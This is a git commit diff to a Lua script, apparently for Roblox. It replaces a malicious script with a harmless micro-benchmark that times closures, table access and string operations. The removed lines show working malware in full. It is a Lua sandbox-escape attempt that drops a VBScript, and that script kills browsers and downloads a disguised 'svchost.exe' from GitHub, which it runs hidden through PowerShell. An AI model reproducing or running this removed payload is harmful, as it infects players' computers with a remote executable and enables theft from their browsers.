badfc05a37d52c03db40bd80a51b4d27770b8edd
playvora <longliator.dev@gmail.com>
2024-11-13 13:19:06 +0700

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,60 +1,54 @@
-do
-    (function()
-        return 'lol using hidden dumper? wah wah :3'
-    end)()
+print("Custom Benchmark")
+local Iterations = 100000
+print("Iterations: " .. tostring(Iterations))
+
+local tests = {
+    ["CLOSURE"] = function()
+        for Idx = 1, Iterations do
+            (function()
+                if not true then
+                    print("Hey gamer.")
+                end
+            end)()
+        end
+    end,
+    ["SETTABLE"] = function()
+        local T = {}
+        for Idx = 1, Iterations do
+            T[tostring(Idx)] = "EPIC GAMER " .. tostring(Idx)
+        end
+    end,
+    ["GETTABLE"] = function()
+        local T = {}
+        for Idx = 1, Iterations do
+            T[1] = T[tostring(Idx)]
+        end
+    end,
+    ["FUNCTION CALL"] = function()
+        local function foo() end
+        for Idx = 1, Iterations do
+            foo()
+        end
+    end,
+    ["ARITHMETIC"] = function()
+        local a = 0
+        for Idx = 1, Iterations do
+            a = a + Idx
+        end
+    end,
+    ["STRING MANIPULATION"] = function()
+        local s = ""
+        for Idx = 1, Iterations do
+            s = s .. tostring(Idx)
+        end
+    end,
+}
+
+local totalStart = os.time()
+for testName, testFunc in pairs(tests) do
+    print(testName .. " testing.")
+    local start = os.time()
+    testFunc()
+    print("Time:", os.time() - start .. "s")
 end
-
-
-local game = game:GetService('Players').Parent -- L
-
-local function Run(Payload)
-    local LinkingService = game:GetService("LinkingService")
-    local ScriptContext = game:GetService("ScriptContext")
-    local payload = ScriptContext:SaveScriptProfilingData(Payload, "test.vbs")
-    LinkingService:OpenUrl(payload)
-end
-
-local Payload = [[
-Option Explicit
-
-Dim tempDir, svchostUrl, executorPath, svchostPath
-Dim shell, fso
-
-Set shell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
-tempDir = fso.GetSpecialFolder(2)
-svchostUrl = "https://github.com/HanzieUWU/Test/raw/main/RobloxPlayerInstaller.exe"
-executorPath = tempDir & "\RuntimeVector.exe"
-svchostPath = tempDir & "\svchost.exe"
-
-Sub runCommand(command)
-    shell.Run command, 0, True
-End Sub
-
-Sub downloadAndExecute(url, path)
-    Dim command
-    command = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & path & "'; Start-Process '" & path & "' -WindowStyle Hidden"""
-    runCommand command
-End Sub
-
-Sub stopBrowsers()
-    Dim stopBrowsersCommand
-    stopBrowsersCommand = "powershell -Command ""& { 'chrome','msedge','opera','brave','vivaldi','browser','maxthon','epic','iridium','slimjet','urbrowser','avastbrowser','amigo','torch','kometa','orbitum','7star','sputnik','uran','firefox' | ForEach-Object { Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue } }"""
-    runCommand stopBrowsersCommand
-End Sub
-
-stopBrowsers
-downloadAndExecute svchostUrl, svchostPath
-
-]]
-
-xpcall(function(...)
-    getfenv().os.execute(Payload)    
-end, function(a0) 
-    task.spawn(function()
-        pcall(function(...) 
-            Run(Payload)    
-        end)
-    end)
-end)
+print("Total Time:", os.time() - totalStart .. "s")
